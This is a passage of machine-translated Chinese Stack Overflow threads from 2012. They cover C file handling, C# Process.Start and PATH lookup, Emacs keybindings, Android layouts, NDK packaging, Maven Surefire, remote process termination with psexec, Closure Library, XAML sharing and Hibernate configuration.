在这一点上，我不知道去哪里看或做什么。

样本数据：

```
44  96  3                                                                                                                                                                                                                                                                                                                                                                                       
0   0   17.57298681 24.18012088 0   24.07599728 0   0   0   19.53417371 22.61467731 15.5650829  18.65720893 21.70631048 26.8811321  23.88086356 23.73544942 0   0   22.63088094 21.11777268 22.06847477 22.38688445 19.6794802  20.95594497 22.56472976 15.5058779  0   16.89366861 21.23974633 0   19.01608872 22.58492673 22.39564384 18.17000387 0   0   25.85404904 23.80483437 22.64271243 0   17.09819014 24.60634479 0   24.74696139 29.27117194 20.8931952  19.08648917 23.95167438 0   0   17.2386599  0   0   23.22304254 22.86712074 0   21.45687449 21.45146304 0   0   0   20.98717232 0   18.09871479 17.8226754  23.72508288 23.34563846 21.26201041 17.44038043 22.49848573 18.99848797 16.43222002 14.8132735  22.28093734 17.78931496 0   20.46914933 17.87742323 21.07936723 23.52102135 0   17.90498094 21.93199281 0   0   16.3020812  0   18.17972854 16.43234906 19.0756696  0   0   22.98048214 23.22184013 21.54024161 0 
```

注意，`num_pats`指的是行数，指`a_length`的是列数。 `b_length`是不同输入类型的数量（每行的最后一个数字）。我的示例文件中有 44 行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T17:08:39.850

加载到 t_file 的字符串的大小是多少？你只在那里分配16个字节......

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-12T16:56:56.550

您没有对“num_pats”进行任何类型的验证。

如果 fscanf 由于某种原因失败，num_pats 可能等于零或负值，这将导致您中止。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-12T17:01:50.720

几乎可以肯定，这个问题是由写入未分配的内存引起的。涉及的操作`FILE *in`看起来不错。

然而，管理动态内存有相当多的复杂性（不管新手——即使对于高级 C 程序员来说，这也是复杂的代码）。由于没有对失败的分配和输入的有效性进行验证检查，因此其中一项分配可能是注销分配的结尾：分配不够大，或者取消引用的方式与原始分配不匹配，使用强制转换时的问题。这样的写入显然会在最终被调用时`FILE *in`导致`fclose()`崩溃。这个问题很久以前就出现`fclose()`了。

如果您包含导致其崩溃的示例输入数据，那么我应该很明显出了什么问题。

# c# - Process.Start() 和 PATH 环境变量

> ID：12392913
> 
> 赞同：14
> 
> 时间：2012-09-12T16:50:18.053
> 
> 标签：c#, path, process.start

我有以下简单的 C# 应用程序，它只是尝试启动“jconsole.exe”，它在我的机器上位于 C:\Programs\jdk16\bin 中。

```
using System;
using System.Diagnostics;

namespace dnet {
  public class dnet {
    static void Main( string[] args ) {
      try {
        Process.Start("jconsole.exe");
        Console.WriteLine("Success!");
      } catch (Exception e) {
        Console.WriteLine("{0} Exception caught.", e);
      }
    }
  }
} 
```

如果我的 PATH 环境变量设置为

```
c:\windows;c:\windows\sytem32;c:\programs\jdk16\bin 
```

它完美地工作。但是，如果 PATH 环境变量设置为

```
c:\windows;c:\windows\sytem32;c:\\programs\jdk16\bin 
```

（注意“c:”和“programs”之间的两个反斜杠），它会因 win32 异常而失败。

```
System.ComponentModel.Win32Exception (0x80004005): The system cannot find the file specified
at System.Diagnostics.Process.StartWithShellExecuteEx(ProcessStartInfo startInfo)
at System.Diagnostics.Process.Start(ProcessStartInfo startInfo)
at dnet.dnet.Main(String[] args) 
```

有趣的是，在我运行 .NET 程序并获得异常的同一命令提示符下，我只需键入“jconsole.exe”，程序就会启动。Windows 似乎可以轻松地在 PATH 中找到带有双反斜杠的可执行文件，但 Process.Start() 可以。

为什么 PATH 中的额外反斜杠会导致问题，以及如何解决该问题？我不知道我要调用的可执行文件在运行时位于何处，所以我宁愿依赖 PATH 变量。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-12T17:33:55.270

不太清楚为什么会出现问题。不过，我可以想到一种适用于我的机器的解决方案：

```
var enviromentPath = System.Environment.GetEnvironmentVariable("PATH");

Console.WriteLine(enviromentPath);
var paths = enviromentPath.Split(';');
var exePath = paths.Select(x => Path.Combine(x, "mongo.exe"))
                   .Where(x => File.Exists(x))
                   .FirstOrDefault();

Console.WriteLine(exePath);

if (string.IsNullOrWhiteSpace(exePath) == false)
{
    Process.Start(exePath);
} 
```

我确实找到了一个段落，它给了我这个解决方案的想法。来自[Process.Start 的文档](http://msdn.microsoft.com/en-us/library/53ezey2s.aspx)

> 如果您在系统中使用引号声明了路径变量，则在启动在该位置找到的任何进程时，您必须完全限定该路径。否则系统将找不到路径。例如，如果 c:\mypath 不在您的路径中，并且您使用引号将其添加：path = %path%;"c:\mypath"，则在启动时必须完全限定 c:\mypath 中的任何进程。

我阅读它的方式，即使`PATH`变量包含 Windows 能够使用的有效路径，`Process.Start`也无法使用它并且需要完全限定的路径**。**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-12T17:37:24.127

如果您首先创建一个`ProcessStartInfo`.

```
ProcessStartInfo psi = new ProcessStartInfo("jconsole.exe");
StringDictionary dictionary = psi.EnvironmentVariables;

// Manipulate dictionary...

psi.EnvironmentVariables["PATH"] = dictionary.Replace(@"\\", @"\");
Process.Start(psi); 
```

您必须自己弄清楚如何操纵 PATH 让它为您工作。但这应该可以解决您的 PATH 变量可能遇到的任何问题。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-12-15T12:19:41.747

接受的答案不正确。

cmd.exe 将首先查找具有可执行扩展名的应用程序。
因此，当您拥有文件`puma`并`puma.bat`进入时`C:\Ruby\bin\`，`puma.bat`则将优先于`puma`.

如果`c:\ruby\bin\puma.bat`从开始`c:\redmine`，它将使用当前工作目录启动 puma `c:\ruby\bin`，并且您的 Web 应用程序将运行。
但是，如果您`c:\ruby\bin\puma`直接启动，它将使用当前工作目录启动 puma，`c:\redmine`随后会失败。

所以一个更正的版本看起来或多或少是这样的：

```
// FindAppInPathDirectories("ruby.exe");
public string FindAppInPathDirectories(string app)
{
    string enviromentPath = System.Environment.GetEnvironmentVariable("PATH");
    string[] paths = enviromentPath.Split(';');

    foreach (string thisPath in paths)
    {
        string thisFile = System.IO.Path.Combine(thisPath, app);
        string[] executableExtensions = new string[] { ".exe", ".com", ".bat", ".sh", ".vbs", ".vbscript", ".vbe", ".js", ".rb", ".cmd", ".cpl", ".ws", ".wsf", ".msc", ".gadget" };

        foreach (string extension in executableExtensions)
        {
            string fullFile = thisFile + extension;

            try
            {
                if (System.IO.File.Exists(fullFile))
                    return fullFile;
            }
            catch (System.Exception ex)
            {
                Log("{0}:\r\n{1}",
                     System.DateTime.Now.ToString(m_Configuration.DateTimeFormat, System.Globalization.CultureInfo.InvariantCulture)
                    , "Error trying to check existence of file \"" + fullFile + "\""
                );

                Log("Exception details:");
                Log(" - Exception type: {0}", ex.GetType().FullName);
                Log(" - Exception Message:");
                Log(ex.Message);
                Log(" - Exception Stacktrace:");
                Log(ex.StackTrace);
            } // End Catch

        } // Next extension

    } // Next thisPath

    foreach (string thisPath in paths)
    {
        string thisFile = System.IO.Path.Combine(thisPath, app);

        try
        {
            if (System.IO.File.Exists(thisFile))
                return thisFile;
        }
        catch (System.Exception ex)
        {
            Log("{0}:\r\n{1}",
                 System.DateTime.Now.ToString(m_Configuration.DateTimeFormat, System.Globalization.CultureInfo.InvariantCulture)
                , "Error trying to check existence of file \"" + thisFile + "\""
            );

            Log("Exception details:");
            Log(" - Exception type: {0}", ex.GetType().FullName);
            Log(" - Exception Message:");
            Log(ex.Message);
            Log(" - Exception Stacktrace:");
            Log(ex.StackTrace);
        } // End Catch

    } // Next thisPath

    return app;
} // End Function FindAppInPathDirectories 
```

# emacs - 重新绑定emacs“cd”删除word

> ID：12392915
> 
> 赞同：3
> 
> 时间：2012-09-12T16:50:21.827
> 
> 标签：emacs, keymapping

我尝试了几种不同的方法来做到这一点，但都没有成功。我想在处理 c++ 文件时分别切换 Md 和 Cd 功能（删除单词、删除字符）。

有人可以帮帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-12T17:17:50.747

```
(add-hook 'c-initialization-hook
          (lambda ()
            (define-key c++-mode-map "\C-d" 'kill-word)
            (define-key c++-mode-map "\M-d" 'c-electric-delete-forward))) 
```

来自[CC Hooks - CC 模式手册](http://www.gnu.org/software/emacs/manual/html_node/ccmode/CC-Hooks.html)：

> 变量：**c-initialization-hook**
> 
> 在初始化 CC 模式时，每个 Emacs 会话只运行一次挂钩。这是在任何 CC 模式键映射中更改键绑定（或添加新键绑定）的好地方。请参阅[示例 .emacs 文件](http://www.gnu.org/software/emacs/manual/html_node/ccmode/Sample-_002eemacs-File.html#Sample-_002eemacs-File)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-12T18:08:12.820

```
(eval-after-load "cc-mode"
  '(progn
     (define-key c++-mode-map (kbd "C-d") 'kill-word)
     (define-key c++-mode-map (kbd "M-d") 'delete-char))) 
```

# android - 如何在相对布局内的图像上放置背景？

> ID：12392922
> 
> 赞同：3
> 
> 时间：2012-09-12T16:50:42.560
> 
> 标签：android, android-layout

注意：我最终将此作为一个错误报告给这里的 android 项目：[http](http://code.google.com/p/android/issues/detail?id=39159) ://code.google.com/p/android/issues/detail?id=39159请也看看接受的赏金答案，不幸的是，解决方案是使用绝对（即指定'dp'而不是'wrap_content'等）布局来解决问题。

在图像上放置背景时，我遇到了一些非常奇怪的行为。我已经大大简化了这一点，以向您展示这个问题。我正在做的是将图像放置在相对布局中，并使用背景。似乎给 relativelayout 一个填充会导致图像的背景被误绘。Wrap_content 似乎搞砸了。

首先，这是演示问题的代码。请注意，在不使用线性布局的情况下会看到相同的行为，而只是为图像视图提供背景，但这确实更好地说明了问题。

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="60dp"
        android:padding="5dp" >
        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/black_bg" >
            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:adjustViewBounds="true"
                android:src="@drawable/red_rectangle" />
        </LinearLayout>
    </RelativeLayout>
</FrameLayout> 
```

这是 black_bg xml 文件：

```
<shape xmlns:android="http://schemas.android.com/apk/res/android">
    <solid android:color="#FF000000"/>
</shape> 
```

这是red_rectangle： ![红色矩形](../Images/a187785a9e005484d3f09f4e4d626d98.png)

请注意，这是一个参考图像，用于演示问题。我的实际图像有细节，所以不能是 .9.png

这是问题的屏幕截图：

![渲染错误](../Images/e863689f775df136cbbed753082d38ac.png)

您可以看到图像宽度小于线性布局，尽管线性布局的宽度设置为“wrap_content”。如果我将 relativelayout 填充设置为 0dp，这个问题就会消失。

希望这是我在这里提供的一组相当完善的资源，因此人们可以根据需要自行尝试。

作为参考，我使用它来提供图像周围的边框，因此我可以将线性布局（或图像本身）设置为具有填充，在这种情况下问题仍然存在。

编辑：看来我可能需要更多的背景信息，因为答案集中在如何提供这个边界上。这是一个更符合上下文的布局的屏幕截图。我不想首先包括这个，因为它给问题增加了更多的混乱：

![截屏](../Images/19ad443b0501a0a799d43f429496b86e.png)

您看到的第一个 5dp 填充是针对整个项目的内容（相对布局）。然后，正如我最初所说的那样，除了您在相对布局中看到的第一个填充之外，“我可以将线性布局（或图像本身）设置为具有填充”。目前，此布局不应显示任何边框。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T09:05:35.513

问题似乎在于图像的不同拉伸属性（在图像视图中）和一个设置为背景（在线性布局中）。设置为背景的图像不一定保持纵横比，而图像中的图像倾向于保持纵横比。当您将布局的高度设置为 60 dp 时，图像会缩小并保持纵横比，而两侧会留下黑色条纹。这对我有用：

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >
    <RelativeLayout
        android:layout_width="wrap_content"
        android:layout_height="60dp"
        android:padding="5dp" >
        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/black_bg" >
            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="60dp"
                android:src="@drawable/asd"
                android:scaleType="fitXY"
                 />
        </LinearLayout>
    </RelativeLayout>
</FrameLayout> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-26T17:23:42.493

我不知道为什么它在那里显示额外的黑色补丁。您是否尝试过运行该应用程序？UI 编辑器有一些缺陷，尤其是在`ImageView`..

现在对于图像周围的边框，将背景和填充设置为`ImageView`自身。不需要LinearLayout。`"centerInside"`添加带有值的比例类型属性。

```
 <ImageView 
      android:layout_width="wrap_content" 
      android:layout_height="wrap_content" 
      android:padding="5dp"
      android:layout_centerInParent="true"
      android:adjustViewBounds="true" 
      android:src="@drawable/red_rectangle"
      android:background="#000" 
      android:scaleType="centerInside"/> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T15:24:22.803

我相信这是一个很好的错误候选者！

无论如何，我了解您打算通过此布局实现的目标。问题是设置RelativeLayout 的高度。我不会要求你包装内容！简单地说，由于高度设置为 60dp，内边距设置为 5dp，因此更进一步，将 LinearLayout 的高度设置为 50dp，即`60-2*5`:)

最后，要获得边框，在 LinearLayout 中添加一个 5dp 的填充，并将 ImageView 的高度设置为`50dp - 2*5 = 40dp`.

***这将完美地工作***

* * *

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="60dp"
        android:padding="5dp" >
        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="50dp"
            android:padding="5dp"
            android:background="@drawable/black_bg" >
            <ImageView
                android:layout_width="wrap_content"
                android:layout_height="40dp"
                android:adjustViewBounds="true"
                android:src="@drawable/red_rectangle" />
        </LinearLayout>
    </RelativeLayout>
</FrameLayout> 
```

* * *

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-12T16:59:05.900

“作为参考，我正在使用它来提供图像周围的边框”

添加一个可绘制的“border.xml”

```
<shape xmlns:android:"http://schemas.android.com/apk/res/android" android:shape:"rectangle">
 <stroke android:width="5dp" android:color="#FF000000" />
 <padding android:left="5dp" android:top="5dp" android:right="5dp" android:bottom="5dp" />
</shape> 
```

将您的 ImageView 背景设置为此可绘制对象。

让我们简化您的布局并将 ImageView 居中：

```
<?xml version="1.0" encoding="utf-8"?> 
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android" 
    android:layout_width="fill_parent" 
    android:layout_height="fill_parent" > 
        <ImageView 
                android:layout_width="wrap_content" 
                android:layout_height="wrap_content" 
                android:layout_centerInParent="true"
                android:adjustViewBounds="true" 
                android:src="@drawable/red_rectangle"
                android:background="@drawable/border" /> 
</RelativeLayout> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-30T10:44:57.257

试试这个 ...........

```
<?xml version="1.0" encoding="utf-8"?>
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >
    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="60dp"
        android:padding="5dp" >
        <LinearLayout
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:background="@drawable/black_bg"
            **android:padding="5dp"**
            >
            <ImageView
                **android:layout_width="fill_parent"
                android:layout_height="fill_parent"**
                android:adjustViewBounds="true"
                android:src="@drawable/red_rectangle" />
        </LinearLayout>
    </RelativeLayout>
</FrameLayout> 
```

使您的图像视图像这样..

```
<ImageView 
            android:id="@+id/imageViewMyicon"
            android:layout_width="30dp"
            android:background="@drawable/myiconbackground"
            android:layout_height="30dp"
            android:src="@drawable/myicon"
            android:contentDescription="@string/my_icon"
            /> 
```

在您的可绘制 myiconbackground.xml 中

```
<shape xmlns:android="http://schemas.android.com/apk/res/android" 
       android:shape="rectangle" 
       android:padding="10dp">
    <solid android:color="#0D95BD"/>
        <corners android:radius="5dp"/>
        <padding android:left="2dp" android:right="2dp" android:top="2dp" android:bottom="2dp"/>
</shape> 
```

我检查了这个对我有用，也应该对你有用

# eclipse - 如何捆绑本地库（.so + .jar）以在新的 Eclipse Android 项目中重用？

> ID：12392924
> 
> 赞同：4
> 
> 时间：2012-09-12T16:50:45.443
> 
> 标签：eclipse, jar, android-ndk, shared-libraries

我有一个 C++ 库，并编写了一些 JNI 代码将其导出到 Android 世界。我还创建了一个使用我的 JNI 接口的 Android 应用程序。

为了使用这个库，我将所有 *.java 和 *.h / *.cpp 文件导入到我的 Eclipse App 项目中（到正确的文件夹中），然后我为 NDK 创建了 *.mk 文件。我使用 ndk-build 编译了该库，并使用 Eclipse 将其加载到目标设备中。该应用程序运行良好。

现在我想将应用程序从库中分离出来。所以，我编译了包含 JNI 接口的 Java 文件的 name.jar，然后我用 ndk-build 编译了 libname.so 用于 C++ 的东西。然后我将 name.jar 放入 newproject/libs 并将 libname.so 放入 newproject/libs/armeabi。考虑“newproject”我创建的没有库源代码的应用程序（我不想发布源代码，只发布 .jar 和 .so）。

结果是应用程序崩溃，内存转储到 LogCat。我在静态上下文中使用了 System.loadLibrary("name")。

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-13T09:28:25.093

我的程序没问题。我发现了问题：我的应用程序正在加载库并且它正在运行 C++ 代码。顺便说一句，崩溃发生在 socket() 调用的早期。我必须在清单文件中设置 INTERNET 权限。

# eclipse - 通过 Eclipse 运行 JUnit 测试时的 Maven 肯定参数

> ID：12392926
> 
> 赞同：7
> 
> 时间：2012-09-12T16:50:56.627
> 
> 标签：eclipse, maven, junit, m2eclipse, maven-surefire-plugin

一个关于 Maven 的新手问题 - Surefire - Eclipse - JUnit

我在项目的 pom 文件中配置了 maven-surefire-plugin 以传递一些额外的 JVM 参数，如下所示：

```
 <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-surefire-plugin</artifactId>
            <version>${maven.surefire.plugin.version}</version>
            <configuration>
                <argLine>-d64 -Xms128m -Xmx4096m -XX:PermSize=512m -Duser.timezone=UTC -XX:-UseSplitVerifier</argLine>
            </configuration>
        </plugin> 
```

当我从 Eclipse 作为 Run As->JUnit Test 运行这个项目的测试用例时，虽然类路径设置正确，但在 argLine 中指定的其他参数不包含在调用中。我必须去手动输入相关的参数`Debug Configurations`。我不太明白 JUnit 如何知道它需要将测试范围的 jar 放在类路径上，并且在某种程度上意味着 Eclipse 中的 JUnit 工具通过 M2E 知道 Maven？如果是这样，我们怎样才能让它也读取argLine。我知道这听起来很具体 - 但其他人在类似情况下如何管理？

提前致谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-12T22:50:39.013

Eclipse JUnit Launcher（选择`Run As -> JUnit Test`）是一个独立的测试运行器，它有自己的预定义构建和运行生命周期，与 Maven 无关，它不会神奇地拿起你的 pom 并读取安全配置​​并使用它们来驱动测试运行。

如果您的项目作为现有 Maven 项目导入，请使用 Maven（选择`Run as -> Maven test`）启动您的 JUnit 测试，该测试将获取并使用 surefire 配置。这与从命令行运行完全相同`mvn test`，它只在控制台中输出运行日志，您将无法使用漂亮的红色和绿色 JUnit UI 窗口。

希望这是有道理的。

# powershell - 使用 psexec 发送多个命令

> ID：12392928
> 
> 赞同：2
> 
> 时间：2012-09-12T16:50:59.510
> 
> 标签：powershell

我想浓缩

```
psexec \\server taskill /f /t /fi "USERNAME eq $username" /im soffice*
psexec \\server taskill /f /t /fi "USERNAME eq $username" /im swriter*
psexec \\server taskill /f /t /fi "USERNAME eq $username" /im scalc*
psexec \\server taskill /f /t /fi "USERNAME eq $username" /im simpress* 
```

进入一个 psexec 命令。通常我会尝试`&`操作员这样做，`so & so`但由于我是在 PS 中做这一切，它似乎不喜欢那样。我尝试了一系列，`()`但`""`它似乎也不喜欢那些。

## 编辑[答案]

最后只是复制了一个`.cmd`（BAT）文件并在我的`$PROFILE`本地创建了一个快捷方式。

```
function flushlibra
{
param([string]$user = "")
if ($user -eq "")
{
    $user = Read-Host "User to nuke LibraOffice proccesses: "
}

psexec -c "\\unc\path\to\flushlibra.cmd" $user
} 
```

`.cmd`文件

```
taskkill /f /t /fi "USERNAME eq %1" /im soffice*
taskkill /f /t /fi "USERNAME eq %1" /im swriter*
taskkill /f /t /fi "USERNAME eq %1" /im scalc*
taskkill /f /t /fi "USERNAME eq %1" /im simpress* 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-12T18:03:41.343

psexec 也允许您远程调用批处理脚本，而不仅仅是单个命令。使用`-c`开关指示应将脚本复制到远程系统。

因此，如果您在本地有一个脚本 KillProcs.cmd：

```
taskill /f /t /fi "USERNAME eq $username" /im soffice*
taskill /f /t /fi "USERNAME eq $username" /im swriter*
taskill /f /t /fi "USERNAME eq $username" /im scalc*
taskill /f /t /fi "USERNAME eq $username" /im simpress* 
```

然后你可以像这样远程运行

```
psexec \\server -c c:\localpath\KillProcs.cmd 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-17T08:59:16.277

我总是这样使用:)并且工作正常

```
psexec \\COMPUTER -e cmd /c (COMMAND1 ^& COMMAND2 ^& COMMAND3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-12T17:50:48.847

如果您只想在一行上连接命令，请使用语句分隔符，`;`例如：

```
psexec \\server taskill /f /t /fi "USERNAME eq $username" /im soffice*; psexec \\server taskill /f /t /fi "USERNAME eq $username" /im swriter* ; psexec \\server taskill /f /t /fi "USERNAME eq $username" /im scalc* ; psexec \\server taskill /f /t /fi "USERNAME eq $username" /im simpress* 
```

从 PSEXEC 的使用来看，它似乎不允许您在一次 PSEXEC 调用中指定多个程序。

顺便说一句，您可以使用 PowerShell 的远程处理功能 - 假设`server`安装了 WMF 2.0 或更高版本并启用了 WSMan 远程处理，例如：

```
Invoke-Command -ComputerName server {Stop-Process -Name soffice*,swriter*,scalc*,simpress* -Force} 
```

如果你不能走远程路由，另一种方法是创建一个 PowerShell 函数：

```
function Stop-RemoteProcess([string]$ComputerName, [string[]]$Programs, [string]$UserName)
{
    foreach ($program in $Programs)
    {
        psexec "\\$ComputerName" taskill /f /t /fi "USERNAME eq $UserName" /im $program
    }
}

Stop-RemoteProcess server soffice*,swriter*,scalc*,simpress* JohnDoe 
```

# google-closure - 谷歌关闭 - goog.require 找不到 goog.ui.AutoComplete

> ID：12392931
> 
> 赞同：3
> 
> 时间：2012-09-12T16:51:06.343
> 
> 标签：google-closure, google-closure-library

更新到 Google Closure Library 的修订版 2156 后，`goog.require()`找不到`goog.ui.AutoComplete`.

```
svn update 
At revision 2156. 
```

**错误信息**

```
goog.require could not find: goog.ui.AutoComplete.Remote base.js:333
Uncaught Error: goog.require could not find: goog.ui.AutoComplete.Remote 
```

一切都很好，除了`goog.ui.AutoComplete`。仅在我更新 Google Closure Library 后才发生此错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-12T17:38:43.457

2012 年 8 月 30 日关闭库[修订版 r2132具有以下日志消息：](https://code.google.com/p/closure-library/source/detail?r=2132)

> 删除所有关闭/用户界面/自动完成代码。这是 goog.ui.AutoComplete 重命名/清理的最后一步
> 
> 如果此更改让您失望 - 首先，对不起！

自动完成的新包是`goog.ui.ac`，所以你的 require 语句需要更新：

```
goog.require('goog.ui.ac.AutoComplete'); 
```

# wpf - 使用 T4 为 WPF 和 Silverlight 统一 XAML？

> ID：12392939
> 
> 赞同：6
> 
> 时间：2012-09-12T16:51:43.527
> 
> 标签：wpf, silverlight, xaml, t4

我正在编写用于 WPF 和 Silverlight 的代码。在 C# 中，我可以`"#if SILVERLIGHT"`用于条件编译，它可以工作。

但是，在 XAML 中，我必须使用完全不同的 XAML 文件，因为某些属性根本不兼容。XAML 文件有 99% 的点赞率，保持它们同步很麻烦。

我想将它们转换为 T4 模板，因此我可以执行以下操作：

```
<SomeControl <#=ClipsToBounds()#> /> 
```

为 WPF 和Silverlight`ClipsToBounds()`生成不同文本的位置。要求是：

*   处理 XAML 时的智能感知
*   构建时生成的模板
*   该项目必须是独立的，并且可以使用 Visual Studio 的库存版本：不接受安装各种 SDK 和 3rd 方编辑器
*   模板运行的结果不应在源代码管理中。-

我发现我可以更改`custom tool`XAML 文件，`MSBuild:Compile to TextTemplatingFileGenerator`并且不会丢失 Intellisense。但是，生成的模板是在设计时生成的。然后在构建时生成似乎是一个很大的痛苦。

有没有人有这种设置的成功经验？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-06T11:22:33.073

只有具有跨平台通用行为的通用用户控件才能放置在 PCL 中，但是，最好的建议是为每个平台保留单独的 xaml 视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-06T13:48:31.300

由于似乎没有人根据需要建议基于模板的解决方案，因此我将分享一些处理针对 SL/WPF 的项目的经验。许多人会建议使用两个完全独立的 XAML 文件，每个平台使用不同的视图，并且在许多方面这是“纯粹”的做法。但是，如果您想消除重复并降低 2 个目标分开的风险，我当然建议共享 XAML 文件（带有简单的项目链接）可以很好地工作。

有一些常见的不兼容情况：

*   控件存在于两个平台的不同命名空间中 - 子类化您自己的版本并引用它。
*   风格等需要在平台之间有所不同 - 包括一个通用的资源字典，每个平台不同，以及按键引用。
*   控件大不相同，或者仅存在于 1 个平台中 - 引入您自己的包装器控件（在“缺失”的情况下可能需要大量实现）。
*   缺少基本属性或功能 - 通常可以通过附加行为破坏某些东西（例如，您的 ClipsToBounds 示例可在[此处](http://www.codeproject.com/Articles/36495/Silverlight-ClipToBounds-Can-I-Clip-It-Yes-You-Can)找到）。

# c++ - ScrollArea 和 TabWidget 调整大小

> ID：12392943
> 
> 赞同：1
> 
> 时间：2012-09-12T16:51:57.247
> 
> 标签：c++, qt, resize, tabwidget

我的应用程序有问题。我无法根据我的需要配置 wigets，我将不胜感激。

这是我真实应用程序的“草图” [http://s13.postimage.org/ibzzdh3p3/tab_Widget.png](http://s13.postimage.org/ibzzdh3p3/tab_Widget.png)

所以 MainWindow 的主要部件是 scrollArea。ScrollArea 具有垂直布局并包含 3 个项目。1\. 是大按钮，在我的真实应用程序中代表恒定大小的区域 2\. 是间隔 3\. TabWidget，在两个选项卡上都有布局。

现在我的问题。我将动态内容放入这些选项卡中，并且我希望如果选项卡内容不适合选项卡，它将在滚动区域中展开 TabWidget。

现在它在合适的地方填充空间，很好的间距等等。但是，如果我用让我们说更多的线条（高度 600 像素）填充它，那么我可以看到线条在选项卡下方的某处消失，并且如果我展开整个窗口 TabWidget 会获得更多空间，并且我隐藏的更多小部件会被显示出来。

有什么想法可以强制tabwidget的内容扩展它而不是隐藏在下面吗？

# java - 为什么 Spring hbm2ddl.auto create 中的 JPA/HIbernate 会更新而不是破坏旧数据？

> ID：12392945
> 
> 赞同：1
> 
> 时间：2012-09-12T16:52:00.257
> 
> 标签：java, hibernate, persistence, hbm2ddl

就像标题所说的那样，我有一个项目，`spring+hibernate`它只更新数据库。显然很多人都有同样的问题。所以我现在的问题是我有一个 import.sql 加载系统用户等是唯一的。在运行程序之前手动清理数据库有点烦人。是否有任何解决方法**可以在重新创建数据之前清除数据**。感谢我的 persistence.xml 和 context.xml 如下所示：`JPA``my persistence.xml` `hbm2ddl.auto=create`

 **```
<!--persistence.xml-->
<persistence version="1.0" xmlns="http://java.sun.com/xml/ns/persistence" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://java.sun.com/xml/ns/persistence http://java.sun.com/xml/ns/persistence/persistence_1_0.xsd">
<persistence-unit name="normal" transaction-type="RESOURCE_LOCAL">
  <provider>org.hibernate.ejb.HibernatePersistence</provider>
  </persistence-unit>
</persistence>

 <!--context.xml-->
<bean id="dataSource" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
    <property name="driverClassName" value="${mysql.jdbc.driverClassName}"/>
    <property name="url" value="${mysql.jdbc.url}"/>
    <property name="username" value="${mysql.jdbc.username}"/>
    <property name="password" value="${mysql.jdbc.password}"/>
</bean>

<bean id="transactionManager" class="org.springframework.orm.jpa.JpaTransactionManager">
    <property name="entityManagerFactory" ref="entityManagerFactory"/>
</bean>

<bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="dataSource" ref="dataSource"/>
    <property name="persistenceUnitName" value="normal"/>

    <property name="jpaProperties">
        <props>
            <prop key="hibernate.dialect">${hibernate.dialect}</prop>
            <prop key="hibernate.show_sql">${hibernate.show_sql}</prop>
            <prop key="hibernate.format_sql">${hibernate.format_sql}</prop>
            <prop key="hibernate.hbm2ddl.auto">${hibernate.hbm2ddl.auto}</prop>
            <prop key="org.hibernate.envers.audit_table_prefix"></prop>
            <prop key="org.hibernate.envers.audit_table_suffix">_AUDITED</prop>                
            <prop key="hibernate.connection.driverClassName">${mysql.jdbc.driverClassName}</prop>
            <prop key="hibernate.connection.url">${mysql.jdbc.url}</prop>
            <prop key="hibernate.connection.username">${mysql.jdbc.username}</prop>
            <prop key="hibernate.connection.password">${mysql.jdbc.password}</prop>
            <prop key="hibernate.connection.provider_class">${mysql.hibernate.connection.provider_class</prop>
            <prop key="hibernate.c3p0.max_size">${mysql.hibernate.c3p0.max_size}</prop>
            <prop key="hibernate.c3p0.min_size">${mysql.hibernate.c3p0.min_size}</prop>
            <prop key="hibernate.c3p0.acquire_increment">${mysql.hibernate.c3p0.acquire_increment}</prop>
            <prop key="hibernate.c3p0.idle_test_period">${mysql.hibernate.c3p0.idle_test_period}</prop>
            <prop key="hibernate.c3p0.max_statements">${mysql.hibernate.c3p0.max_statements}</prop>
            <prop key="hibernate.c3p0.timeout">${mysql.hibernate.c3p0.timeout}</prop>
        </props>
    </property>
</bean>

